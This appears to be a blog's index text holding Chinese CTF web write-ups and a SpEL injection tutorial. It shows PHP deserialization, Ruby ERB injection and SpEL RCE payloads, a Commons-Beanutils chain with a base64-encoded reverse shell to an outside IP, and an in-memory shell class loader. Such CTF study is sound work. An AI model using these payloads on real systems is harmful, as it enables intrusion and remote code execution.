= $_POST;\n        $c = $this->c;\n        $d = $this->d;\n        if (isset($b['a'])) {\n            unset($b['a']);\n        }\n        if ($this->is_class($a)){\n            call_user_func($a, $b)($c)($d);\n        }else{\n            die(\"你真该请教一下oSthinggg哥哥了\");\n        }\n    }\n```\n\n这个跟xyctf2024中的ezPOP是一样的，但是之前的方法是用`implode`函数去进行连接字符串然后进行调用的，但这里的话有一个if语句判断\n\n```php\n    function is_class($input){\n        if (strpos($input, '::') !== false) {\n            return $this->is_method($input);\n        }\n\n        if (!class_exists($input, false)) {\n            return false;\n        }\n\n        try {\n            return (new ReflectionClass($input))->isInternal();\n        } catch (ReflectionException $e) {\n            return false;\n        }\n    }\n\n```\n\n其实就是检测是否是静态类方法的调用，用Closure::fromCallable去创建一个闭包对象就行了\n\n![image-20250804175100108](../image/achieve/202411/春秋杯/image-20250804175100108.png)\n\n本地测试一下\n\n```php\n<?php\n\nfunction test($name){\n    echo \"hello, $name\";\n}\n\n$closure = Closure::fromCallable('test');\n$closure('world');//输出hello, world\n```\n\n那我们试一下刚刚的动态链式函数调用\n\n```php\n<?php\n\n$a = \"Closure::fromCallable\";\n$b = array(\"Closure\", \"fromCallable\");\n$c = \"system\";\n$d = \"whoami\";\n\ncall_user_func($a, $b)($c)($d);\n//wanth3f1ag\\23232\n```\n\n这里的话就成功绕过了，后面的话就跟xyctf里面的那道题一样了，绕过GC回收，用数组去包装一下序列化字符串就行了，直接用`array($c, null)`得到一个数组,然后改成非法数组\n\n最终的poc\n\n```php\n<?php\nclass class_A\n{\n    public $s;\n    public $a;\n}\nclass class_B\n{\n    public $c;\n    public $d;\n}\n\nclass class_C\n{\n    public $c;\n}\n//class_C::__destruct()->class_A::__toString()->class_B::__get()\n$c = new class_C();\n$c -> c = new class_A();\n$c -> c -> s = new class_B();\n$c -> c -> s -> c = \"system\";\n$c -> c -> s -> d = \"whoami\";\n$d = serialize(array($c,null));\n$e = str_replace(\"i:1;N;\",\"i:0;N;\",$d);\necho $e;\n//a:2:{i:0;O:7:\"class_C\":1:{s:1:\"c\";O:7:\"class_A\":2:{s:1:\"s\";O:7:\"class_B\":2:{s:1:\"c\";s:6:\"system\";s:1:\"d\";s:6:\"whoami\";}s:1:\"a\";N;}}i:0;N;}\n```\n\n分别传入\n\n```html\nGET:?un=a:2:{i:0;O:7:\"class_C\":1:{s:1:\"c\";O:7:\"class_A\":2:{s:1:\"s\";O:7:\"class_B\":2:{s:1:\"c\";s:6:\"system\";s:1:\"d\";s:6:\"whoami\";}s:1:\"a\";N;}}i:0;N;}\n\nPOST:0=Closure&1=fromCallable&a=Closure::fromCallable\n```\n\n![image-20250804180548292](../image/achieve/202411/春秋杯/image-20250804180548292.png)\n\n成功RCE(这里的话是用的自己的本地环境)，原环境的flag在环境变量中，并且是无回显的，所以需要打无回显RCE，这里就不多说了\n\n其他的web就没环境做了。。。\n\n## ez_ruby\n\n```ruby\nrequire \"sinatra\"\nrequire \"erb\"\nrequire \"json\"\n\nclass User\n    attr_reader :name, :age\n\n    def initialize(name=\"oSthinggg\", age=21)\n        @name = name\n        @age = age\n    end\n\n    def is_admin?\n        if to_s == \"true\"\n            \"a admin,good!give your fake flag! flag{RuBy3rB_1$_s3_1Z}\"\n        else\n            \"not admin,your \"+@to_s\n        end\n    end\n\n    def age\n        if @age > 20\n            \"old\"\n        else\n            \"young\"\n        end\n    end\n\n\n    def merge(original, additional, current_obj = original)\n        additional.each do |key, value|\n            if value.is_a?(Hash)\n            next_obj = current_obj.respond_to?(key) ? current_obj.public_send(key) : Object.new\n            current_obj.singleton_class.attr_accessor(key) unless current_obj.respond_to?(key)\n            current_obj.instance_variable_set(\"@#{key}\", next_obj)\n            merge(original, value, next_obj)\n            else\n            current_obj.singleton_class.attr_accessor(key) unless current_obj.respond_to?(key)\n            current_obj.instance_variable_set(\"@#{key}\", value)\n            end\n        end\n        original\n    end\nend\n\nuser = User.new(\"oSthinggg\", 21)\n\n\nget \"/\" do  \n    redirect \"/set_age\"\nend\n\nget \"/set_age\" do\n    ERB.new(File.read(\"views/age.erb\", encoding: \"UTF-8\")).result(binding)\nend\n\npost \"/set_age\" do\n    request.body.rewind\n    age = JSON.parse(request.body.read)\n    user.merge(user,age)\nend\n\nget \"/view\" do \n    name=user.name().to_s\n    op_age=user.age().to_s\n    is_admin=user.is_admin?().to_s\n    ERB::new(\"<h1>Hello,oSthinggg!#{op_age} man!you #{is_admin} </h1>\").result\nend     \n```\n\n又是一门自己之前没接触过的语言Ruby，只能先配环境然后去学一下基础知识\n\n推荐看菜鸟教程：https://www.runoob.com/ruby/ruby-installation-windows.html\n\n先做常规的代码审计，不过这个代码的意思还是很简单的\n\n先定义了一个User类，设置了两个只读属性name和age和一个`initialize`初始化方法，并且后面实例化了一个User对象\n\n```ruby\nuser = User.new(\"oSthinggg\", 21)\n```\n\n接着往下看\n\n```ruby\n    def is_admin?\n        if to_s == \"true\"\n            \"a admin,good!give your fake flag! flag{RuBy3rB_1$_s3_1Z}\"\n        else\n            \"not admin,your \"+@to_s\n        end\n    end\n    def age\n        if @age > 20\n            \"old\"\n        else\n            \"young\"\n        end\n    end\n```\n\n有一个管理员身份验证和年龄的判定函数，所以只要当前对象（user）调用 `to_s` 方法返回 \"true\"，就认为是 admin。\n\n接下来我们看污染函数merge，解题的关键！\n\n```ruby\n    def merge(original, additional, current_obj = original)\n        additional.each do |key, value|\n            if value.is_a?(Hash)\n            next_obj = current_obj.respond_to?(key) ? current_obj.public_send(key) : Object.new\n            current_obj.singleton_class.attr_accessor(key) unless current_obj.respond_to?(key)\n            current_obj.instance_variable_set(\"@#{key}\", next_obj)\n            merge(original, value, next_obj)\n            else\n            current_obj.singleton_class.attr_accessor(key) unless current_obj.respond_to?(key)\n            current_obj.instance_variable_set(\"@#{key}\", value)\n            end\n        end\n        original\n    end\n```\n\noriginal是原对象，additional是我们传入的JSON Hash例如（`{\"key\",\"value\"]`）\n\n先是遍历了key和value，如果value是JSON Hash的话， 就递归嵌套调用merge函数，如果是普通值就直接赋值并添加属性访问器\n\n写个简单的demo测试一下\n\n```ruby\nclass User\n    attr_reader :name, :age\n    def initialize(name=\"oSthinggg\", age=21)\n        @name = name\n        @age = age\n    end\n\n    def merge(original, additional, current_obj = original)\n        additional.each do |key, value|\n            if value.is_a?(Hash)\n            next_obj = current_obj.respond_to?(key) ? current_obj.public_send(key) : Object.new\n            current_obj.singleton_class.attr_accessor(key) unless current_obj.respond_to?(key)\n            current_obj.instance_variable_set(\"@#{key}\", next_obj)\n            merge(original, value, next_obj)\n            else\n            current_obj.singleton_class.attr_accessor(key) unless current_obj.respond_to?(key)\n            current_obj.instance_variable_set(\"@#{key}\", value)\n            end\n        end\n        original\n    end\nend\nuser = User.new(\"oSthinggg\", 21)\ntest = {\n    \"age\" => 22\n}\nuser.merge(user,test)\nprint user.age\n```\n\n输出\n\n```ruby\nage is 22\nname is oSthinggg\n```\n\n这里可以看到是成功污染了的\n\n我们继续往下看接口\n\n```ruby\nget \"/\" do  \n    redirect \"/set_age\"\nend\n\nget \"/set_age\" do\n    ERB.new(File.read(\"views/age.erb\", encoding: \"UTF-8\")).result(binding)\nend\n\npost \"/set_age\" do\n    request.body.rewind\n    age = JSON.parse(request.body.read)\n    user.merge(user,age)\nend\n\nget \"/view\" do \n    name=user.name().to_s\n    op_age=user.age().to_s\n    is_admin=user.is_admin?().to_s\n    ERB::new(\"<h1>Hello,oSthinggg!#{op_age} man!you #{is_admin} </h1>\").result\nend     \n```\n\n这里可以post传一个表单到/set_age接口，然后这里的话会解析成JSON的Hash并调用merge函数去污染属性\n\n`/view`接口最终会显示用户名，这里会将name和age转化成字符串，to_s是一种内置的方法，用于将对象转化成字符串。之后会检查admin身份，并返回flag内容。\n\n这里的话其实可以看到是一个ERB模板注入，new语句很明显是一个拼接的状态，那我们在to_s中去进行注入\n\n```ruby\n{\"to_s\": \"<%= env %>\"}\n```\n\n然后访问/view拿到flag\n\n我这里自己起的环境进行测试\n\n```sh\n├── app.rb\n└── views\n    └── age.erb\n```\n\n这是目录结构\n\n然后需要安装**Sinatra 和 JSON Gems**\n\n```shell\ngem install sinatra\ngem install json\n```\n\n在app.rb文件所在目录下运行\n\n```shell\nE:\\Ruby\\Ruby-projects>ruby app.rb\n== Sinatra (v4.1.1) has taken the stage on 4567 for development with backup from Puma\n*** SIGUSR2 not implemented, signal based restart unavailable!\n*** SIGUSR1 not implemented, signal based restart unavailable!\n*** SIGHUP not implemented, signal based logs reopening unavailable!\nPuma starting in single mode...\n* Puma version: 6.6.1 (\"Return to Forever\")\n* Ruby version: ruby 3.4.5 (2025-07-16 revision 20cda200d3) +PRISM [x64-mingw-ucrt]\n*  Min threads: 0\n*  Max threads: 5\n*  Environment: development\n*          PID: 30736\n* Listening on http://[::1]:4567\n* Listening on http://127.0.0.1:4567\nUse Ctrl-C to stop\n```\n\n然后访问4567端口\n\n测试一下\n\n```html\nPOST /set_age HTTP/1.1\nHost: 127.0.0.1:4567\nContent-Length: 27\nsec-ch-ua-platform: \"Windows\"\nAccept-Language: zh-CN,zh;q=0.9\nsec-ch-ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"\nContent-Type: application/json\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36\nAccept: */*\nOrigin: http://127.0.0.1:4567\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://127.0.0.1:4567/set_age\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n{\"to_s\": \"<%= 7*7 %>\"}\n    \n```\n\n然后get访问/view路由\n\n![image-20250807152312633](../image/achieve/202411/春秋杯/image-20250807152312633.png)\n\n成功了！那我们试一下其他payload\n\n```ruby\n<%= 7 * 7 %>\n<%= File.open(‘/etc/passwd’).read %>\n<%= self %>    //枚举该对象可用的属性及方法\n<%= self.class.name %>   //获取self对象的类名\n<%= self.methods %>\t\t//获取当前类的可用方法\n<%= system(\"whoami\")%>\t//执行系统命令\n```\n\n这里system函数执行的结果没有回显结果，只会回显system函数的执行结果true或者false，但是输出会被打印到运行Sinatra服务器的那个进程的**标准输出**里\n\n![image-20250807153026833](../image/achieve/202411/春秋杯/image-20250807153026833.png)\n\n我们换成反引号输出命令执行结果\n\n```ruby\n{\"to_s\": \"<%= `whoami` %>\"}\n```\n\n![image-20250807153228866](../image/achieve/202411/春秋杯/image-20250807153228866.png)\n\n成功RCE\n","tags":["2025春秋杯夏季赛"],"categories":["赛题wp"]},{"title":"PolarCTF-Web方向题解","url":"/2025/08/06/PolarCTF-Web方向题解/","content":"\n## ezjava\n\n### #Spel表达式注入\n\n 题目提示flag在/app/flag.txt\n\n先把附件的jar包丢jadx看一下\n\n![image-20250806180641392](../image/achieve/202411/PolarCTF-web/image-20250806180641392.png)\n\n```java\npackage com.example.demo.controller;\n\nimport org.springframework.expression.EvaluationContext;\nimport org.springframework.expression.ExpressionParser;\nimport org.springframework.expression.spel.standard.SpelExpressionParser;\nimport org.springframework.expression.spel.support.StandardEvaluationContext;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RequestMapping({\"/SPEL\"})\n@RestController\n/* loaded from: demo1-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/demo/controller/spel.class */\npublic class spel {\n    @RequestMapping({\"/vul\"})\n    public String spelVul(String ex) {\n        ExpressionParser parser = new SpelExpressionParser();\n        EvaluationContext evaluationContext = new StandardEvaluationContext();\n        String result = parser.parseExpression(ex).getValue(evaluationContext).toString();\n        System.out.println(result);\n        return result;\n    }\n}\n```\n\n一眼SpEL表达式注入，直接打就行\n\n```java\n/SPEL/vul?ex=T(java.lang.Runtime).getRuntime().exec(\"whoami\")\n```\n\n![image-20250811150257046](../image/achieve/202411/PolarCTF-web/image-20250811150257046.png)\n\n但是命令执行结果并没有回显出来，因为exec函数本身就是会返回一个进程对象，所以需要读出来\n\n```java\n/SPEL/vul?ex=new+java.io.BufferedReader(new+java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec(%27whoami%27).getInputStream())).readLine()\n```\n\n注意这里需要URL编码，不然hackbar没法传\n\n![image-20250811150339423](../image/achieve/202411/PolarCTF-web/image-20250811150339423.png)\n\n## CB链\n\n先找找依赖文件例如pom.xml\n\n![image-20250811152049611](../image/achieve/202411/java学习/image-20250811152049611.png)\n\nCommons-beanutils是1.9.2版本，并且是Spring Boot项目，然后就根据这个框架去搜注解找一下路由\n\n- @RestController\n- @Controller\n- @RequestMapping\n- @GetMapping\n- @PostMapping\n\n![image-20250811152708904](../image/achieve/202411/java学习/image-20250811152708904.png)\n\n跟进看一下org.example.controller.IndexController类\n\n```java\npackage org.example.controller;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ObjectInputStream;\nimport javax.servlet.http.HttpServletRequest;\nimport org.example.User;\nimport org.example.tools.Tools;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.ResponseBody;\n\n@Controller\n/* loaded from: CB.jar:BOOT-INF/classes/org/example/controller/IndexController.class */\npublic class IndexController {\n    @RequestMapping({\"/\"})\n    @ResponseBody\n    public String index(HttpServletRequest request) {\n        String ipAddress = request.getHeader(\"X-Forwarded-For\");\n        if (ipAddress == null) {\n            ipAddress = request.getRemoteAddr();\n        }\n        return \"Welcome PolarCTF~ <br>Client IP Address: \" + ipAddress;\n    }\n\n    @RequestMapping({\"/user\"})\n    @ResponseBody\n    public String getUser(String user) throws Exception {\n        byte[] userBytes = Tools.base64Decode(user);\n        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(userBytes));\n        User userObj = (User) in.readObject();\n        return userObj.getUserNicename();\n    }\n}\n```\n\n很明显可以看到在/user路由下先会对传入的user字段的值进行一个base64解码并进行反序列化操作，最后调用getUserNicename方法\n\n![image-20250811155444460](../image/achieve/202411/PolarCTF-web/image-20250811155444460.png)\n\n看到这里也导入了CC3.2.1的依赖，直接打CB链反序列化就行\n\n```java\nroot@VM-16-12-ubuntu:/opt/javaexp# java -jar ysoserial-all.jar CommonsBeanutils1 \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjI1LjE4Ni8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\"|base64\n```\n\n本来想反弹shell的，但是发现好像不出网，那就打内存马吧\n\n先写个反序列化的POC\n\n```java\npackage SerializeChains.CBchains.POC;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.beanutils.BeanComparator;\n\nimport javax.xml.transform.Templates;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.Base64;\nimport java.util.PriorityQueue;\n\npublic class CBPOC1 {\n    public static void main(String[] args) throws Exception {\n        byte[] bytes = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\JavaSerialize\\\\target\\\\classes\\\\SerializeChains\\\\CCchains\\\\CC3\\\\POC.class\"));\n        TemplatesImpl templates = (TemplatesImpl) getTemplates(bytes);\n\n        BeanComparator comparator = new BeanComparator();\n        PriorityQueue queue = new PriorityQueue<Object>(2, comparator);\n        queue.add(1);\n        queue.add(2);\n        setFieldValue(comparator, \"property\", \"outputProperties\");//修改property触发getter方法\n        setFieldValue(queue,\"queue\",new Object[]{templates,templates});// 设置BeanComparator.compare()的参数\n        \n        serialize_base64(queue);\n    }\n    //将序列化字符串转为base64\n    public static void serialize_base64(Object object) throws Exception{\n        ByteArrayOutputStream data = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(data);\n        oos.writeObject(object);\n        oos.close();\n        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));\n    }\n\n    //获取恶意templates对象\n    public static Object getTemplates(byte[] bytes) throws Exception{\n        Templates templates = new TemplatesImpl();\n        setFieldValue(templates, \"_bytecodes\", new byte[][]{bytes});\n        setFieldValue(templates, \"_name\", \"wanth3f1ag\");\n        setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        return templates;\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws Exception {\n        Field field = object.getClass().getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n}\n```\n\n然后写个类加载器，动态加载字节码：MyClassLoader\n\n```java\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\nimport java.util.Base64;\n\npublic class MyClassLoader extends AbstractTranslet {\n    static{\n        try{\n            javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n            java.lang.reflect.Field r=request.getClass().getDeclaredField(\"request\");\n            r.setAccessible(true);\n            org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse();\n            javax.servlet.http.HttpSession session = request.getSession();\n            String classData=request.getParameter(\"classData\");\n            System.out.println(\"classData:\"+classData);\n            byte[] classBytes = Base64.getDecoder().decode(classData);\n            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\",new Class[]{byte[].class, int.class, int.class});\n            defineClassMethod.setAccessible(true);\n            Class cc = (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, 0,classBytes.length);\n            cc.newInstance().equals(new Object[]{request,response,session});\n        }catch(Exception e){\n            e.printStackTrace();\n        }\n    }\n    public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {\n    }\n    public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException {\n\n    }\n}\n```\n\n\n\n","tags":["PolarCTF"],"categories":["赛题wp"]},{"title":"Java之SpEL表达式注入","url":"/2025/08/05/Java之SpEL表达式注入/","content":"\n参考文章：\n\nhttps://xz.aliyun.com/news/16342\n\nhttps://forum.butian.net/share/2483\n\n## 0x01SpEL表达式\n\n官方文档：https://docs.spring.io/spring-framework/reference/core/expressions.html\n\nSpEL（Spring Expression Language）简称Spring表达式语言，是一种功能强大的表达式语言，它可以用于在Spring配置中动态地访问和操作对象属性、调用方法、执行计算等，SPEL的设计目标是让Spring应用程序中的bean配置和运行时操作更加灵活和可扩展，其语法和OGNL、MVEL等表达式语法类似。\n\nSpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。\n\n## 0x02常见表达式\n\n一些比较常见的表达式\n\n| 运算符类型 | 运算符                               |\n| :--------- | :----------------------------------- |\n| 算数运算   | +, -, *, /, %, ^                     |\n| 关系运算   | <, >, ==, <=, >=, lt, gt, eq, le, ge |\n| 逻辑运算   | and, or, not, !                      |\n| 条件运算   | ?:(ternary), ?:(Elvis)               |\n| 正则表达式 | matches                              |\n\n| 运算符   | 符号 | 文本类型 |\n| :------- | :--- | :------- |\n| 等于     | ==   | eq       |\n| 小于     | <    | lt       |\n| 小于等于 | <=   | le       |\n| 大于     | >    | gt       |\n| 大于等于 | >=   | ge       |\n\n## 0x03使用方法\n\n从使用方法上来看，一共分为三类，分别是直接在注解中使用，在XML文件中使用和直接在代码块中使用。\n\n### @value注解中动态注入\n\n在Spring框架中我们可以使用@Value注解结合SpEL表达式来动态注入值\n\n```java\npackage org.example.springdemo;\n\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class ValueTest {\n\n    // 使用SpEL进行加法运算\n    @Value(\"#{10 + 20}\")\n    private int sum;\n\n    // 使用SpEL进行减法运算\n    @Value(\"#{30 - 15}\")\n    private int difference;\n\n    // 使用SpEL进行乘法运算\n    @Value(\"#{5 * 6}\")\n    private int product;\n\n    // 使用SpEL进行除法运算\n    @Value(\"#{40 / 8}\")\n    private int quotient;\n\n    // 使用SpEL进行求余运算\n    @Value(\"#{10 % 3}\")\n    private int remainder;\n\n    public void displayResults() {\n        System.out.println(\"Sum: \" + sum);\n        System.out.println(\"Difference: \" + difference);\n        System.out.println(\"Product: \" + product);\n        System.out.println(\"Quotient: \" + quotient);\n        System.out.println(\"Remainder: \" + remainder);\n    }\n}\n\n```\n\n![image-20250805171629332](../image/achieve/202411/java学习/image-20250805171629332.png)\n\n我们跟进这个注解看一下\n\n![image-20250805171830545](../image/achieve/202411/java学习/image-20250805171830545.png)\n\n解释一下\n\n```java\n@Target({\n    ElementType.FIELD,           // 可用于字段\n    ElementType.METHOD,          // 可用于方法（如 setter）\n    ElementType.PARAMETER,       // 可用于构造函数或方法参数\n    ElementType.ANNOTATION_TYPE  // 可用于注解内嵌注解（meta-annotation）\n})\n```\n\n这里表示了value注解可以用在哪些地方\n\n```java\n@Retention(RetentionPolicy.RUNTIME)\n```\n\n说明 `@Value` 注解会在 **运行时保留**，Spring 框架可以在运行时通过反射读取这个注解的值。\n\nXML配置文件中使用，我还没学xml，这里暂时不写\n\n### 代码块中使用表达式\n\n这个的话主要涉及四个步骤：\n\n1. 创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；\n2. 解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象；\n3. 构造上下文：上下文其实就是设置好某些变量的值，执行表达式时根据这些设置好的内容区获取值；（可选，必须在取值前设置变量）\n4. 表达式求值：通过 Expression 接口的 `getValue` 方法根据上下文获得表达式值。\n\n例如我们这里写个demo测试一下\n\n```java\npackage org.example.springdemo;\n\nimport org.springframework.expression.EvaluationContext;\nimport org.springframework.expression.Expression;\nimport org.springframework.expression.ExpressionParser;\nimport org.springframework.expression.spel.standard.SpelExpressionParser;\nimport org.springframework.expression.spel.support.StandardEvaluationContext;\n\npublic class SpELTest {\n    public static void main(String[] args) {\n\n        //1、创建解析器\n        ExpressionParser parser = new SpelExpressionParser();\n        //2、解析表达式\n        Expression expression = parser.parseExpression(\"'Hello '.concat(#end)\");\n        //3、创建上下文\n        EvaluationContext context = new StandardEvaluationContext();\n        //定义变量\n        context.setVariable(\"end\", \"wanth3f1ag\");\n        //求表达式值\n        System.out.println(expression.getValue(context));//输出Hello wanth3f1ag\n    }\n}\n```\n\n## 0x04漏洞原理\n\nSpEL表达式语言主要用于将表达式解析为AST语法树并计算每个树节点，由于SpEL表达式可以操作类及其对应的方法，所以当用户可以控制输入的表达式并且可以绕过黑名单限制时便可以达到RCE的目的。\n\nSpEL表达式的典型代码\n\n```java\nExpressionParser parser = new SpelExpressionParser();\nExpression expression = parser.parseExpression(userInput);\nObject result = expression.getValue();\n```\n\n如果这里userInput是用户可控的，那么就可以执行任意代码\n\n### 类类型表达式\n\nspel语法中的`T()`操作符 , `T()`操作符会返回一个object , 用法`T(全限定类名).方法名()`，**使用类类型表达式还可以进行访问类静态方法及类静态字段**\n\n## 0x05漏洞利用\n\n## RCE的第一部分\n\n### java.lang.Runtime\n\n因为getRuntime()是静态方法，所以直接用T()操作符，随后调用exec执行系统命令\n\n```java\npackage org.example.springdemo;\n\nimport org.springframework.expression.Expression;\nimport org.springframework.expression.ExpressionParser;\nimport org.springframework.expression.spel.standard.SpelExpressionParser;\n\npublic class SpELTest {\n    public static void main(String[] args) {\n\n        String spel = \"T(java.lang.Runtime).getRuntime().exec(\\\"calc\\\")\";\n        //1、创建解析器\n        ExpressionParser parser = new SpelExpressionParser();\n        //2、解析表达式\n        Expression expression = parser.parseExpression(spel);\n        //3、求表达式值\n        System.out.println(expression.getValue());\n    }\n}\n```\n\n![image-20250805173515358](../image/achieve/202411/java学习/image-20250805173515358.png)\n\n注意：如果java中需要传入带空格的命令的话，需要用`{}`连接\n\n例如\n\n```java\nexec(new String[]{\"open\",\"/System/Applications/Calculator.app\"})\n```\n\n但是因为exec函数本身就是只会返回一个进程对象\n\n![image-20250811145155125](../image/achieve/202411/java学习/image-20250811145155125.png)\n\n![image-20250811145212111](../image/achieve/202411/java学习/image-20250811145212111.png)\n\n![image-20250811145223863](../image/achieve/202411/java学习/image-20250811145223863.png)\n\n如果要打印命令执行结果的话，可以这么写\n\n```java\nString spel = \"new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec(\\\"whoami\\\").getInputStream())).readLine()\";\n```\n\n### ProcessBuilder\n\n从上面最后一个exec函数可以看到，其实最终也是调用了ProcessBuilder的start方法去执行命令的\n\nProcessBuilder中的start方法可以执行任意命令，我们看一下源码\n\n![image-20250805174328874](../image/achieve/202411/java学习/image-20250805174328874.png)\n\n下面第二个start才是我们真正会调用到的，这里的话会启动一个子进程并执行程序，关注到这里的参数\n\n```java\nString prog = cmdarray[0];\n```\n\n这个就是需要执行的程序，跟进看一下这个属性command\n\n![image-20250805174654671](../image/achieve/202411/java学习/image-20250805174654671.png)\n\n发现构造函数可以给这个参数赋值，但是这里并不是静态方法，所以用new去实例化一个新对象并赋值\n\n```java\npackage org.example.springdemo;\n\nimport org.springframework.expression.Expression;\nimport org.springframework.expression.ExpressionParser;\nimport org.springframework.expression.spel.standard.SpelExpressionParser;\n\npublic class SpELTest {\n    public static void main(String[] args) {\n\n        String spel = \"new java.lang.ProcessBuilder(new String[]{\\\"calc\\\"}).start()\";\n        //1、创建解析器\n        ExpressionParser parser = new SpelExpressionParser();\n        //2、解析表达式\n        Expression expression = parser.parseExpression(spel);\n        //3、求表达式值\n        System.out.println(expression.getValue());\n    }\n}\n```\n\n![image-20250805173750828](../image/achieve/202411/java学习/image-20250805173750828.png)\n\n也是一样的，这里如果需要获取命令执行输出的话需要用到上面的poc\n\n```java\nString spel = \"new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.ProcessBuilder(new String[]{\\\"whoami\\\"}).start().getInputStream())).readLine()\";\n```\n\n### javax.script.ScriptEngineManager\n\n我们先获取一下js引擎的信息\n\n```java\npackage org.example.springdemo;\n\nimport javax.script.ScriptEngineFactory;\nimport javax.script.ScriptEngineManager;\nimport java.util.List;\n\n\npublic class SpELTest {\n    public static void main(String[] args) {\n\n        ScriptEngineManager manager = new ScriptEngineManager();\n        List<ScriptEngineFactory> factories = manager.getEngineFactories();\n        for (ScriptEngineFactory factory: factories){\n            System.out.printf(\n                    \"Name: %s%n\" + \"Version: %s%n\" + \"Language name: %s%n\" +\n                            \"Language version: %s%n\" +\n                            \"Extensions: %s%n\" +\n                            \"Mime types: %s%n\" +\n                            \"Names: %s%n\",\n                    factory.getEngineName(),\n                    factory.getEngineVersion(),\n                    factory.getLanguageName(),\n                    factory.getLanguageVersion(),\n                    factory.getExtensions(),\n                    factory.getMimeTypes(),\n                    factory.getNames()\n            );\n        }\n    }\n}\n\n```\n\n输出\n\n```java\nName: Oracle Nashorn\nVersion: 1.8.0_321\nLanguage name: ECMAScript\nLanguage version: ECMA - 262 Edition 5.1\nExtensions: [js]\nMime types: [application/javascript, application/ecmascript, text/javascript, text/ecmascript]\nNames: [nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]\n```\n\n根据执行结果中的Names我们知道了所有的JS引擎名称，故getEngineByName的参数可以填[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]\n\n所以我们构建poc\n\n需要注意，getEngineByName不是静态方法，故需要用new去执行\n\n```java\npackage org.example.springdemo;\n\nimport org.springframework.expression.Expression;\nimport org.springframework.expression.ExpressionParser;\nimport org.springframework.expression.spel.standard.SpelExpressionParser;\n\n\npublic class SpELTest {\n    public static void main(String[] args) {\n        String spel = \"new javax.script.ScriptEngineManager().getEngineByName(\\\"nashorn\\\").eval(\\\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\\\")\";\n        //1、创建解析器\n        ExpressionParser parser = new SpelExpressionParser();\n        //2、解析表达式\n        Expression expression = parser.parseExpression(spel);\n        //3、求表达式值\n        System.out.println(expression.getValue());\n    }\n}\n```\n\n![image-20250805182140001](../image/achieve/202411/java学习/image-20250805182140001.png)\n\n解释一下spel代码\n\n```java\nnew javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")\n```\n\n使用 Java 自带的脚本引擎 **Nashorn** 来执行 JavaScript 代码，最终目的是 **弹出计算器**\n\n```java\ns = [1];                     // 创建一个 JavaScript 数组 s，初始元素是 1\ns[0] = 'calc';              // 将数组第一个元素替换为字符串 'calc'\njava.lang.Runtime.getRuntime().exec(s);\n```\n\n这里的话用其他引擎也是可以的，同理JavaScript\n\n```java\npackage org.example.springdemo;\n\nimport org.springframework.expression.Expression;\nimport org.springframework.expression.ExpressionParser;\nimport org.springframework.expression.spel.standard.SpelExpressionParser;\n\n\npublic class SpELTest {\n    public static void main(String[] args) {\n        String spel = \"new javax.script.ScriptEngineManager().getEngineByName(\\\"javascript\\\").eval(\\\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\\\")\";\n        //1、创建解析器\n        ExpressionParser parser = new SpelExpressionParser();\n        //2、解析表达式\n        Expression expression = parser.parseExpression(spel);\n        //3、求表达式值\n        System.out.println(expression.getValue());\n    }\n}\n```\n\n![image-20250805182309643](../image/achieve/202411/java学习/image-20250805182309643.png)\n\n## 